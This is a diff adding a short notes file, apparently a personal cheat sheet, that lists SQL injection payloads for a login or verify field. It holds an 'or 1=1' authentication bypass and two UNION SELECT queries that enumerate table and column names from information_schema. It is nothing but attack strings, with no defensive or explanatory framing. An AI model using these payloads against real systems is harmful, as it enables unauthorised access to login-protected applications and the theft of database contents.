@@ -1,0 +1,6 @@
+SQL injection commands: used on login / verify bar
+
+1 or 1=1
+
+1 UNION SELECT table_name,2,3,4 FROM information_schema.tables
+1 UNION SELECT column_name,2,3,4 FROM information_schema.columns
